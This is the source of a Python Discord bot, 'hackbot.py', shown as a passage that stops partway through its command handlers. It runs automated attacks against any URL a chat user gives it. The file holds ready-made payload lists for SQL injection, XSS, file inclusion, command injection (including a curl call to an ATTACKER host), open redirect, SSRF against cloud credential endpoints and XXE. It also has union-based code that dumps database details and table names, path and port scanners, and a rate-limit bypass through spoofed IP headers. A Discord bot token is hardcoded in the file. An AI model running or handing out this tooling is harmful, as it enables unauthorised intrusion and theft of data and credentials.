#!/usr/bin/env python3
# hackbot.py
# usage: python hackbot.py

import asyncio
import base64
import hashlib
import html
import json
import os
import random
import re
import string
import sys
import time
import urllib.parse as up
from datetime import datetime

import aiohttp
import discord
from discord.ext import commands
from bs4 import BeautifulSoup

try:
    import uvloop
    uvloop.install()
except Exception:
    pass

# ============== CONFIG ==============

TOKEN = "MTU1NzM2MDc0NTQwOTI4MjIwOQ.G_be7s._Zg7XGE09zwtNMVHPQV4ngTi1eQ9q2ZMaHL3Bk"

PREFIX = "/"
TIMEOUT = 12
CONCURRENCY = 40
REPORT_DIR = "reports"
PROXY_FILE = "proxy.txt"

os.makedirs(REPORT_DIR, exist_ok=True)

UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 Version/17.1 Safari/605.1.15",
    "curl/8.4.0",
]


def proxies():
    if not os.path.exists(PROXY_FILE):
        return []
    with open(PROXY_FILE) as f:
        return [l.strip() for l in f if l.strip()]


def headers():
    return {
        "user-agent": random.choice(UA),
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "connection": "keep-alive",
    }


# ============== PAYLOADS ==============

SQLI_ERROR = [
    "'", "\"", "')", "\"))", "';", "\";",
    "' OR '1'='1", "' OR 1=1–", "' OR 1=1#", "' OR 1=1/*",
    "\" OR \"1\"=\"1", "\" OR 1=1–",
    "1' AND 1=1–", "1' AND 1=2–",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--",
    "1' AND (SELECT 1 FROM (SELECT SLEEP(5))x)--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
]

BLIND_TESTS = [
    ("' AND 1=1–", "' AND 1=2–"),
    ("' AND '1'='1", "' AND '1'='2"),
    ("\" AND 1=1–", "\" AND 1=2–"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("') AND 1=1–", "') AND 1=2–"),
    ("' OR 1=1–", "' OR 1=2–"),
]

TIME_PAYLOADS = {
    "mysql":    ("' AND SLEEP({s})-- ", 5),
    "mysql2":   ("' AND (SELECT SLEEP({s}))-- ", 5),
    "mysql3":   ("1' AND SLEEP({s})#", 5),
    "mssql":    ("'; WAITFOR DELAY '0:0:{s}'--", 5),
    "postgres": ("'; SELECT pg_sleep({s})--", 5),
    "oracle":   ("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',{s})--", 5),
    "sqlite":   ("' AND 1=randomblob(100000000*{s})--", 5),
}

SQL_ERRORS = [
    r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySQLSyntaxErrorException",
    r"valid MySQL result", r"PostgreSQL.*ERROR", r"Warning.*\Wpg_",
    r"valid PostgreSQL result", r"Driver.*SQL Server", r"OLE DB.*SQL Server",
    r"SQLServer JDBC Driver", r"Oracle error", r"Oracle.*Driver",
    r"quoted string not properly terminated", r"SQLite/JDBCDriver",
    r"SQLite.Exception", r"System.Data.SQLite.SQLiteException",
    r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine",
]

XSS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    "\"><script>alert(1)</script>",
    "'><svg/onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<a href=javascript:alert(1)>x</a>",
    "<script>alert(document.domain)</script>",
    "<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>",
    "<svg><script>alert(1)</script>",
    "<math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=1 onerror=alert(1)>\">",
]

LFI = [
    "../../../../etc/passwd", "../../../../etc/passwd%00",
    "....//....//....//etc/passwd", "..%2f..%2f..%2f..%2fetc/passwd",
    "/etc/passwd", "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=string.rot13/resource=index.php",
    "expect://id", "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
    "/proc/self/environ", "....//....//....//....//etc/shadow",
    "C:\\Windows\\win.ini", "..\\..\\..\\..\\windows\\win.ini",
    "../../../../etc/hosts", "../../../../etc/hostname",
    "../../../../var/log/apache2/access.log",
    "../../../../var/log/auth.log",
]

CMDI = [
    ";id", "|id", "||id", "&id", "&&id", "`id`", "$(id)",
    ";id;", "\nid", "%0aid",
    ";cat /etc/passwd", "|cat /etc/passwd",
    ";whoami", "|whoami", "$(whoami)", "`whoami`",
    ";uname -a", "|uname -a",
    ";curl http://ATTACKER/", "|ping -c 1 127.0.0.1",
    ";sleep 5", "|sleep 5", "$(sleep 5)",
]

OPENREDIR = [
    "//evil.com", "https://evil.com", "http://evil.com",
    "////evil.com", "/\\evil.com", "https:evil.com",
    "//google.com@evil.com", "https://evil.com#.target.com",
    "?url=https://evil.com", "?next=https://evil.com",
    "/redirect?to=https://evil.com", "\\/\\/evil.com",
    "/%09/evil.com", "/%2F/evil.com", "//evil.com/%2f..",
]

SSRF = [
    "http://127.0.0.1/", "http://127.0.0.1:80/", "http://127.0.0.1:22/",
    "http://127.0.0.1:3306/", "http://127.0.0.1:6379/",
    "http://localhost/", "http://[::1]/", "http://0.0.0.0/",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://192.168.0.1/", "http://10.0.0.1/",
    "file:///etc/passwd", "file:///c:/windows/win.ini",
    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:6379/INFO",
]

WAF_SIGS = {
    "Cloudflare":   ["cloudflare", "cf-ray", "__cfduid", "cf-cache-status"],
    "AWS WAF":      ["awselb", "x-amzn-requestid", "x-amz-cf-id"],
    "Akamai":       ["akamai", "x-akamai-transformed"],
    "Sucuri":       ["x-sucuri-id", "x-sucuri-cache"],
    "Incapsula":    ["incap_ses", "visid_incap", "x-iinfo"],
    "F5 BIG-IP":    ["bigipserver", "x-wa-info", "ts="],
    "ModSecurity":  ["mod_security", "modsecurity"],
    "Barracuda":    ["barra_counter_session", "barracuda"],
    "Imperva":      ["x-iinfo", "incap_ses"],
    "DenyAll":      ["sessioncookie=", "x-denyall"],
    "Wordfence":    ["wordfence", "wfwaf"],
    "StackPath":    ["stackpath", "x-sp-url"],
    "Fastly":       ["x-served-by", "fastly"],
    "Varnish":      ["x-varnish", "via: 1.1 varnish"],
    "Nginx":        ["nginx"],
    "Apache":       ["apache"],
}

ADMIN_PATHS = [
    "admin","admin/","admin.php","admin/login","administrator/",
    "wp-admin/","wp-login.php","wp-admin/admin.php",
    "phpmyadmin/","pma/","mysql/","myadmin/",
    "cpanel/","whm/","webmail/",
    "login","login.php","signin","auth","session",
    "dashboard","panel","manage","manager","console",
    "adminpanel","admin_area","admin_area/","admin1","admin2",
    "sysadmin","admin-console","administrator",
    "backend","controlpanel","control/","admin/login.php",
    "user/login","account/login","portal",
    "api/admin","api/v1/admin","graphql",
    ".git/","","env",".env",".svn/","backup/","backups/",
    "config.php","configuration.php","web.config","settings.py",
    "robots.txt","sitemap.xml","phpinfo.php","info.php",
    "server-status","server-info",".htaccess",".htpasswd",
    "test/","tests/","dev/","staging/","debug/",
    "swagger/","swagger-ui/","api-docs/","openapi.json",
    "actuator","actuator/health","actuator/env","actuator/beans",
    "metrics","health","healthz","ready","readyz",
]

COMMON_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995,
    1433, 1521, 1723, 2049, 2082, 2083, 2181, 2375, 2376, 3000, 3306,
    3389, 4444, 5000, 5432, 5601, 5900, 5984, 6379, 6443, 7001, 8000,
    8008, 8080, 8081, 8443, 8888, 9000, 9090, 9200, 9300, 10000, 11211,
    27017, 28017, 50070,
]

SENSITIVE_PATHS = [
    "/.git/config", "/.git/HEAD", "/.svn/entries", "/.DS_Store",
    "/.env", "/.env.bak", "/.env.local", "/.env.production",
    "/config.php.bak", "/config.php~", "/wp-config.php.bak",
    "/database.yml", "/secrets.yml", "/settings.py",
    "/web.config", "/.htaccess", "/.htpasswd",
    "/backup.zip", "/backup.tar.gz", "/backup.sql", "/dump.sql",
    "/db.sql", "/database.sql", "/phpinfo.php", "/info.php",
    "/.aws/credentials", "/.docker/config.json",
    "/id_rsa", "/id_rsa.pub", "/.ssh/id_rsa",
    "/server-status", "/server-info", "/nginx_status",
    "/phpmyadmin/", "/adminer.php",
    "/api/swagger.json", "/swagger.json", "/openapi.json",
    "/actuator/health", "/actuator/env", "/actuator/heapdump",
]


# ============== HTTP ==============

async def _request(session, method, url, data=None, extra_headers=None,
                   cookies=None, proxy=None, allow_redirect=False, timeout=TIMEOUT):
    h = headers()
    if extra_headers:
        h.update(extra_headers)
    try:
        async with session.request(
            method, url, data=data, headers=h, cookies=cookies,
            proxy=proxy, timeout=aiohttp.ClientTimeout(total=timeout),
            allow_redirects=allow_redirect, ssl=False,
        ) as r:
            body = await r.read()
            return r.status, dict(r.headers), body[:131072], str(r.url)
    except Exception:
        return None, {}, b"", url


async def http_get(session, url, proxy=None, allow_redirect=False,
                   extra_headers=None, cookies=None):
    st, hd, bd, _ = await _request(session, "GET", url, None, extra_headers,
                                   cookies, proxy, allow_redirect)
    return st, hd, bd


async def http_post(session, url, data=None, proxy=None,
                    extra_headers=None, cookies=None):
    st, hd, bd, _ = await _request(session, "POST", url, data, extra_headers,
                                   cookies, proxy, False)
    return st, hd, bd


def is_sql_error(text):
    for p in SQL_ERRORS:
        if re.search(p, text, re.IGNORECASE):
            return p
    return None


def chunk_output(text, size=1900):
    return [text[i:i+size] for i in range(0, len(text), size)]


# ============== FINDING STORE ==============

FINDINGS = []


def save_finding(kind, target, param, payload, evidence):
    rec = {
        "ts": datetime.utcnow().isoformat(),
        "kind": kind, "target": target, "param": param,
        "payload": str(payload)[:500],
        "evidence": str(evidence)[:500],
    }
    FINDINGS.append(rec)
    sid = hashlib.md5(target.encode()).hexdigest()[:8]
    path = os.path.join(REPORT_DIR, f"{sid}.jsonl")
    with open(path, "a") as f:
        f.write(json.dumps(rec) + "\n")
    return rec


def load_findings(target):
    sid = hashlib.md5(target.encode()).hexdigest()[:8]
    path = os.path.join(REPORT_DIR, f"{sid}.jsonl")
    if not os.path.exists(path):
        return []
    with open(path) as f:
        return [json.loads(l) for l in f if l.strip()]


def export_html(target):
    items = load_findings(target)
    if not items:
        return None
    rows = "".join(
        f"<tr><td>{html.escape(i['ts'])}</td><td>{html.escape(i['kind'])}</td>"
        f"<td>{html.escape(i['param'])}</td><td><code>{html.escape(i['payload'])}</code></td>"
        f"<td>{html.escape(i['evidence'])}</td></tr>"
        for i in items
    )
    doc = f"""<!doctype html><html><head><meta charset="utf-8">
<title>report {html.escape(target)}</title>
<style>
body{{font-family:monospace;background:#111;color:#eee;padding:20px}}
table{{border-collapse:collapse;width:100%}}
td,th{{border:1px solid #444;padding:4px 8px;font-size:12px}}
code{{background:#222;padding:2px 4px}}
</style></head><body>
<h1>Report: {html.escape(target)}</h1>
<p>findings: {len(items)} — {datetime.utcnow().isoformat()}</p>
<table><tr><th>time</th><th>kind</th><th>param</th><th>payload</th><th>evidence</th></tr>
{rows}</table></body></html>"""
    path = os.path.join(REPORT_DIR, f"{hashlib.md5(target.encode()).hexdigest()[:8]}.html")
    with open(path, "w") as f:
        f.write(doc)
    return path


# ============== SCANNERS ==============

async def sqli_scan(url, param=None):
    findings = []
    async with aiohttp.ClientSession() as s:
        for p in SQLI_ERROR:
            if param:
                u = re.sub(rf"{param}=[^&]*", f"{param}={up.quote(p)}", url)
            else:
                u = url + ("" if "?" in url else "?id=") + up.quote(p)
            t0 = time.time()
            st, hd, bd = await http_get(s, u)
            dt = time.time() - t0
            text = bd.decode(errors="ignore")
            err = is_sql_error(text)
            if err:
                findings.append(("error", p, err))
            if ("SLEEP" in p or "WAITFOR" in p) and dt > 4.5:
                findings.append(("time", p, f"{dt:.1f}s"))
    return findings


async def sqli_blind(url, param):
    findings = []
    async with aiohttp.ClientSession() as s:
        _, _, base_body = await http_get(s, url)
        base_len = len(base_body)
        for true_p, false_p in BLIND_TESTS:
            u_t = re.sub(rf"{param}=[^&]*", f"{param}={up.quote(true_p)}", url)
            u_f = re.sub(rf"{param}=[^&]*", f"{param}={up.quote(false_p)}", url)
            _, _, bt = await http_get(s, u_t)
            _, _, bf = await http_get(s, u_f)
            lt, lf = len(bt), len(bf)
            if abs(lt - base_len) < 50 and abs(lf - base_len) > 200:
                findings.append(("boolean", true_p, f"{base_len} vs {lf}"))
            elif abs(lt - lf) > 200:
                findings.append(("boolean_diff", true_p, f"{lt} vs {lf}"))
    return findings


async def sqli_time(url, param):
    findings = []
    async with aiohttp.ClientSession() as s:
        t0 = time.time()
        await _request(s, "GET", url, timeout=20)
        base_dt = time.time() - t0
        for name, (tpl, sec) in TIME_PAYLOADS.items():
            payload = tpl.format(s=sec)
            u = re.sub(rf"{param}=[^&]*", f"{param}={up.quote(payload)}", url)
            t0 = time.time()
            await _request(s, "GET", u, timeout=20)
            dt = time.time() - t0
            if dt - base_dt > (sec - 1):
                findings.append(("time", name, f"{dt:.1f}s"))
    return findings


async def sqli_union_columns(url, param, max_cols=20):
    cols = 0
    async with aiohttp.ClientSession() as s:
        for n in range(1, max_cols + 1):
            payload = f"1' ORDER BY {n}-- "
            u = re.sub(rf"{param}=[^&]*", f"{param}={up.quote(payload)}", url)
            st, _, bd = await http_get(s, u)
            text = bd.decode(errors="ignore")
            if (st and st >= 500) or is_sql_error(text):
                cols = n - 1
                break
        else:
            cols = max_cols
    return cols


async def sqli_dump_union(url, param, cols, expr):
    if cols < 1:
        return []
    results = []
    async with aiohttp.ClientSession() as s:
        for pos in range(cols):
            arr = ["NULL"] * cols
            arr[pos] = expr
            payload = f"1' UNION SELECT {','.join(arr)}-- "
            u = re.sub(rf"{param}=[^&]*", f"{param}={up.quote(payload)}", url)
            _, _, bd = await http_get(s, u)
            text = bd.decode(errors="ignore")
            m = re.search(r"~([^~]{1,300})~", text)
            if m:
                results.append((pos, m.group(1)))
    return results


async def sqli_dump_basic(url, param):
    cols = await sqli_union_columns(url, param)
    if cols < 1:
        return cols, {}
    data = {}
    for name, expr in [
        ("version", "CONCAT(0x7e,version(),0x7e)"),
        ("user", "CONCAT(0x7e,user(),0x7e)"),
        ("db", "CONCAT(0x7e,database(),0x7e)"),
        ("hostname", "CONCAT(0x7e,@@hostname,0x7e)"),
        ("datadir", "CONCAT(0x7e,@@datadir,0x7e)"),
        ("basedir", "CONCAT(0x7e,@@basedir,0x7e)"),
    ]:
        data[name] = await sqli_dump_union(url, param, cols, expr)
    return cols, data


async def sqli_dump_tables(url, param, cols, dbtype="mysql"):
    queries = {
        "mysql": "SELECT GROUP_CONCAT(table_name SEPARATOR 0x7c) FROM information_schema.tables WHERE table_schema=database()",
        "mssql": "SELECT STRING_AGG(name, '|') FROM sys.tables",
        "postgres": "SELECT STRING_AGG(tablename, '|') FROM pg_tables WHERE schemaname='public'",
    }
    q = queries.get(dbtype, queries["mysql"])
    expr = f"CONCAT(0x7e,({q}),0x7e)" if dbtype == "mysql" else f"({q})"
    return await sqli_dump_union(url, param, cols, expr)


async def sqli_dump_columns(url, param, cols, table, dbtype="mysql"):
    q = f"SELECT GROUP_CONCAT(column_name SEPARATOR 0x7c) FROM information_schema.columns WHERE table_name=0x{table.encode().hex()}"
    expr = f"CONCAT(0x7e,({q}),0x7e)"
    return await sqli_dump_union(url, param, cols, expr)


async def sqli_post(url, data_dict):
    findings = []
    async with aiohttp.ClientSession() as s:
        for k in data_dict:
            for p in SQLI_ERROR[:10]:
                d = dict(data_dict)
                d[k] = p
                st, _, bd = await http_post(s, url, data=d)
                text = bd.decode(errors="ignore")
                err = is_sql_error(text)
                if err:
                    findings.append(("post_error", k, p, err))
    return findings


async def xss_scan(url, param=None):
    findings = []
    async with aiohttp.ClientSession() as s:
        for p in XSS:
            if param:
                u = re.sub(rf"{param}=[^&]*", f"{param}={up.quote(p)}", url)
            else:
                u = url + ("" if "?" in url else "?q=") + up.quote(p)
            _, _, bd = await http_get(s, u)
            text = bd.decode(errors="ignore")
            if p in text:
                findings.append(("reflected", p))
    return findings


async def xss_post(url, data_dict):
    findings = []
    async with aiohttp.ClientSession() as s:
        for k in data_dict:
            for p in XSS[:8]:
                d = dict(data_dict)
                d[k] = p
                st, _, bd = await http_post(s, url, data=d)
                text = bd.decode(errors="ignore")
                if p in text:
                    findings.append(("post_reflect", k, p))
    return findings


async def lfi_scan(url, param):
    findings = []
    async with aiohttp.ClientSession() as s:
        for p in LFI:
            u = re.sub(rf"{param}=[^&]*", f"{param}={up.quote(p)}", url)
            _, _, bd = await http_get(s, u)
            text = bd.decode(errors="ignore")
            if "root:x:0:0" in text:
                findings.append(("lfi_passwd", p))
            if "[extensions]" in text or "[fonts]" in text:
                findings.append(("lfi_winini", p))
            if "localhost" in text and "/etc/hosts" in p:
                findings.append(("lfi_hosts", p))
    return findings


async def cmdi_scan(url, param):
    findings = []
    async with aiohttp.ClientSession() as s:
        for p in CMDI:
            u = re.sub(rf"{param}=[^&]*", f"{param}={up.quote(p)}", url)
            t0 = time.time()
            _, _, bd = await http_get(s, u)
            text = bd.decode(errors="ignore")
            dt = time.time() - t0
            if re.search(r"uid=\d+\([^)]+\)", text):
                findings.append(("cmdi_uid", p))
            if "root:x:0:0" in text:
                findings.append(("cmdi_passwd", p))
            if "Linux" in text and "uname" in p:
                findings.append(("cmdi_uname", p))
            if dt > 4.5 and "sleep" in p.lower():
                findings.append(("cmdi_time", p, f"{dt:.1f}s"))
    return findings


async def openredir_scan(url, param):
    findings = []
    async with aiohttp.ClientSession() as s:
        for p in OPENREDIR:
            u = re.sub(rf"{param}=[^&]*", f"{param}={up.quote(p)}", url)
            _, hd, _ = await http_get(s, u, allow_redirect=False)
            loc = hd.get("Location", "") or hd.get("location", "")
            if "evil.com" in loc.lower():
                findings.append(("openredirect", p, loc))
    return findings


async def ssrf_scan(url, param):
    findings = []
    async with aiohttp.ClientSession() as s:
        for p in SSRF:
            u = re.sub(rf"{param}=[^&]*", f"{param}={up.quote(p)}", url)
            t0 = time.time()
            _, _, bd = await http_get(s, u)
            text = bd.decode(errors="ignore")
            dt = time.time() - t0
            if "meta-data" in text or "ami-id" in text:
                findings.append(("aws_metadata", p))
            if "computeMetadata" in text or "project-id" in text:
                findings.append(("gcp_metadata", p))
            if "root:x:0:0" in text:
                findings.append(("ssrf_file", p))
            if dt > 4.5:
                findings.append(("ssrf_timeout", p, f"{dt:.1f}s"))
    return findings


async def admin_finder(base):
    base = base.rstrip("/")
    hits = []
    sem = asyncio.Semaphore(CONCURRENCY)
    async with aiohttp.ClientSession() as s:
        async def one(p):
            async with sem:
                u = f"{base}/{p}"
                st, _, bd = await http_get(s, u, allow_redirect=False)
                if st in (200, 301, 302, 401, 403):
                    hits.append((u, st, len(bd)))
        await asyncio.gather(*[one(p) for p in ADMIN_PATHS])
    return hits


async def sensitive_files(base):
    base = base.rstrip("/")
    hits = []
    sem = asyncio.Semaphore(CONCURRENCY)
    async with aiohttp.ClientSession() as s:
        async def one(p):
            async with sem:
                u = f"{base}{p}"
                st, _, bd = await http_get(s, u, allow_redirect=False)
                if st == 200 and len(bd) > 0:
                    txt = bd.decode(errors="ignore")
                    if ".env" in p and ("DB_" in txt or "SECRET" in txt or "KEY" in txt):
                        hits.append((u, st, "ENV_LEAK", len(bd)))
                    elif ".git" in p and ("[core]" in txt or "ref:" in txt):
                        hits.append((u, st, "GIT_LEAK", len(bd)))
                    elif "phpinfo" in p and "PHP Version" in txt:
                        hits.append((u, st, "PHPINFO", len(bd)))
                    elif ".sql" in p and ("INSERT INTO" in txt or "CREATE TABLE" in txt):
                        hits.append((u, st, "SQLDUMP", len(bd)))
                    elif "backup" in p.lower() and len(bd) > 500:
                        hits.append((u, st, "BACKUP", len(bd)))
                    elif "actuator" in p and ("status" in txt or "components" in txt):
                        hits.append((u, st, "ACTUATOR", len(bd)))
        await asyncio.gather(*[one(p) for p in SENSITIVE_PATHS])
    return hits


async def port_scan(host, ports=None, timeout=1.5):
    ports = ports or COMMON_PORTS
    open_ports = []
    sem = asyncio.Semaphore(CONCURRENCY)
    async def one(p):
        async with sem:
            try:
                r, w = await asyncio.wait_for(
                    asyncio.open_connection(host, p), timeout=timeout
                )
                w.close()
                try:
                    await w.wait_closed()
                except Exception:
                    pass
                open_ports.append(p)
            except Exception:
                pass
    await asyncio.gather(*[one(p) for p in ports])
    return sorted(open_ports)


async def waf_detect(url):
    async with aiohttp.ClientSession() as s:
        st, hd, bd = await http_get(s, url)
        text = bd.decode(errors="ignore").lower()
        hdr_low = {k.lower(): str(v).lower() for k, v in hd.items()}
        found = []
        for waf, sigs in WAF_SIGS.items():
            for sig in sigs:
                if sig in text or any(sig in k for k in hdr_low):
                    found.append(waf)
                    break
        return found, st


async def subdomain_enum(domain, wordlist=None):
    words = wordlist or [
        "www","mail","ftp","webmail","smtp","pop","ns1","ns2","webdisk","ns",
        "cpanel","whm","autodiscover","autoconfig","m","imap","test","ns3",
        "blog","pop3","dev","www2","admin","forum","news","vod","mail2",
        "old","new","mysql","oldmail","test2","staging","api","app","cdn",
        "static","assets","img","images","video","media","shop","store",
        "secure","vpn","portal","direct","remote","server","host","cloud",
        "docs","help","support","status","monitor","stats","track","link",
        "go","redirect","short","auth","login","sso","id","oauth","internal",
        "intranet","extranet","backup","bak","old","temp","tmp","cache",
    ]
    hits = []
    sem = asyncio.Semaphore(CONCURRENCY)
    async def probe(w):
        async with sem:
            host = f"{w}.{domain}"
            try:
                await asyncio.wait_for(
                    asyncio.get_event_loop().getaddrinfo(host, None), timeout=3
                )
                hits.append(host)
            except Exception:
                pass
    await asyncio.gather(*[probe(w) for w in words])
    return hits


async def header_inject(url, header_name, header_val):
    async with aiohttp.ClientSession() as s:
        st, hd, bd = await http_get(s, url, extra_headers={header_name: header_val})
        return st, hd, bd[:8192]


async def robots_scan(base):
    base = base.rstrip("/")
    found_paths = []
    async with aiohttp.ClientSession() as s:
        for f in ("/robots.txt", "/sitemap.xml", "/sitemap_index.xml"):
            st, _, bd = await http_get(s, f"{base}{f}")
            if st == 200 and len(bd) > 0:
                txt = bd.decode(errors="ignore")
                found_paths.append((f, txt[:1000]))
    return found_paths


async def dirb(base, wordlist=None):
    words = wordlist or [
        "admin","api","backup","config","css","dashboard","data","db","dev",
        "docs","download","files","images","img","include","js","lib","log",
        "logs","old","private","public","scripts","src","static","temp",
        "test","tmp","upload","uploads","user","users","vendor","www",
    ]
    base = base.rstrip("/")
    hits = []
    sem = asyncio.Semaphore(CONCURRENCY)
    async with aiohttp.ClientSession() as s:
        async def one(w):
            async with sem:
                for suf in ("", "/", ".php", ".html", ".txt", ".zip", ".bak"):
                    u = f"{base}/{w}{suf}"
                    st, _, bd = await http_get(s, u, allow_redirect=False)
                    if st in (200, 301, 302, 401, 403):
                        hits.append((u, st, len(bd)))
                        break
        await asyncio.gather(*[one(w) for w in words])
    return hits


async def rl_bypass_test(url, n=30):
    def rnd_ip():
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    ok = 0
    async with aiohttp.ClientSession() as s:
        for _ in range(n):
            hh = {
                "X-Forwarded-For": rnd_ip(),
                "X-Real-IP": rnd_ip(),
                "X-Originating-IP": rnd_ip(),
                "X-Remote-IP": rnd_ip(),
                "X-Remote-Addr": rnd_ip(),
                "X-Client-IP": rnd_ip(),
                "CF-Connecting-IP": rnd_ip(),
            }
            st, _, _ = await http_get(s, url, extra_headers=hh)
            if st == 200:
                ok += 1
    return ok, n


async def http_methods(url):
    """Test allowed HTTP methods."""
    allowed = []
    async with aiohttp.ClientSession() as s:
        for m in ("GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "TRACE", "CONNECT", "HEAD"):
            st, hd, _ = await _request(s, m, url, timeout=6)
            if st and st not in (405, 501):
                allowed.append((m, st))
    return allowed


async def clickjacking_test(url):
    async with aiohttp.ClientSession() as s:
        st, hd, _ = await http_get(s, url)
        xfo = hd.get("X-Frame-Options", "") or hd.get("x-frame-options", "")
        csp = hd.get("Content-Security-Policy", "") or hd.get("content-security-policy", "")
        vulnerable = False
        if not xfo and "frame-ancestors" not in csp.lower():
            vulnerable = True
        return vulnerable, xfo, csp


async def cors_test(url, origin="https://evil.com"):
    async with aiohttp.ClientSession() as s:
        st, hd, _ = await http_get(s, url, extra_headers={"Origin": origin})
        acao = hd.get("Access-Control-Allow-Origin", "") or hd.get("access-control-allow-origin", "")
        acac = hd.get("Access-Control-Allow-Credentials", "") or hd.get("access-control-allow-credentials", "")
        return acao, acac, acao == origin


async def csp_test(url):
    async with aiohttp.ClientSession() as s:
        st, hd, _ = await http_get(s, url)
        csp = hd.get("Content-Security-Policy", "") or hd.get("content-security-policy", "")
        issues = []
        if not csp:
            issues.append("missing CSP")
        if "unsafe-inline" in csp.lower():
            issues.append("unsafe-inline")
        if "unsafe-eval" in csp.lower():
            issues.append("unsafe-eval")
        if "*" in csp and "default-src *" in csp.lower():
            issues.append("wildcard source")
        return csp, issues


async def ssti_test(url, param):
    findings = []
    payloads = [
        ("{{7*7}}", "49"),
        ("${7*7}", "49"),
        ("<%= 7*7 %>", "49"),
        ("#{7*7}", "49"),
        ("{{7*'7'}}", "7777777"),
        ("${{7*7}}", "49"),
    ]
    async with aiohttp.ClientSession() as s:
        for p, expect in payloads:
            u = re.sub(rf"{param}=[^&]*", f"{param}={up.quote(p)}", url)
            _, _, bd = await http_get(s, u)
            text = bd.decode(errors="ignore")
            if expect in text:
                findings.append(("ssti", p, expect))
    return findings


async def crlf_test(url, param):
    findings = []
    payloads = [
        "%0d%0aInjected-Header: pwned",
        "%0aInjected-Header: pwned",
        "%23%0d%0aInjected-Header: pwned",
        "\\r\\nInjected-Header: pwned",
    ]
    async with aiohttp.ClientSession() as s:
        for p in payloads:
            u = re.sub(rf"{param}=[^&]*", f"{param}={p}", url)
            _, hd, _ = await http_get(s, u, allow_redirect=False)
            if "Injected-Header" in hd or "injected-header" in {k.lower() for k in hd}:
                findings.append(("crlf", p))
    return findings


async def xxe_test(url, param):
    findings = []
    payloads = [
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><r>&xxe;</r>',
    ]
    async with aiohttp.ClientSession() as s:
        for p in payloads:
            d = {param: p}
            st, _, bd = await http_post(s, url, data=d,
                                        extra_headers={"Content-Type": "application/xml"})
            text = bd.decode(errors="ignore")
            if "root:x:0:0" in text or "[extensions]" in text:
                findings.append(("xxe", p))
    return findings


# ============== AGGREGATE ==============

async def full_scan(url, param, method="GET", data=None):
    results = {}
    if method == "GET":
        results["sqli_error"] = await sqli_scan(url, param)
        results["sqli_blind"] = await sqli_blind(url, param)
        results["sqli_time"] = await sqli_time(url, param)
        results["xss"] = await xss_scan(url, param)
        results["lfi"] = await lfi_scan(url, param)
        results["cmdi"] = await cmdi_scan(url, param)
        results["redir"] = await openredir_scan(url, param)
        results["ssrf"] = await ssrf_scan(url, param)
        results["ssti"] = await ssti_test(url, param)
        results["crlf"] = await crlf_test(url, param)
    elif method == "POST" and data:
        results["sqli_post"] = await sqli_post(url, data)
        results["xss_post"] = await xss_post(url, data)
        for k in data:
            results["xxe"] = await xxe_test(url, k)
    for kind, hits in results.items():
        for item in hits:
            if isinstance(item, (list, tuple)):
                p = item[1] if len(item) > 1 else ""
                ev = item[2] if len(item) > 2 else ""
            else:
                p, ev = str(item), ""
            save_finding(kind, url, param or "", p, ev)
    return results


# ============== DISCORD BOT ==============

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=PREFIX, intents=intents)


@bot.event
async def on_ready():
    print(f"online {bot.user} guilds={len(bot.guilds)}")


@bot.command(name="ping")
async def ping(ctx):
    await ctx.send("pong")


# ---- SQLi ----

@bot.command(name="sqli")
async def sqli(ctx, url: str, param: str = None):
    m = await ctx.send(f"sqli scan {url} param={param}")
    hits = await sqli_scan(url, param)
    for h in hits:
        save_finding("sqli_error", url, param or "", h[1], h[2])
    if not hits:
        return await m.edit(content=f"no sqli: {url}")
    out = "\n".join(f"[{t}] {p} :: {e}" for t, p, e in hits[:50])
    await m.edit(content=f"hits={len(hits)}\n```{out[:1900]}```")


@bot.command(name="sqli_blind")
async def sqli_blind_cmd(ctx, url: str, param: str):
    m = await ctx.send(f"blind sqli {url} param={param}")
    hits = await sqli_blind(url, param)
    for h in hits:
        save_finding("sqli_blind", url, param, h[1], h[2])
    if not hits:
        return await m.edit(content="no blind sqli")
    out = "\n".join(f"[{t}] {p} :: {e}" for t, p, e in hits[:50])
    await m.edit(content=f"hits={len(hits)}\n```{out[:1900]}```")


@bot.command(name="sqli_time")
async def sqli_time_cmd(ctx, url: str, param: str):
    m = await ctx.send(f"time sqli {url} param={param}")
    hits = await sqli_time(url, param)
    for h in hits:
        save_finding("sqli_time", url, param, h[1], h[2])
    if not hits:
        return await m.edit(content="no time-based sqli")
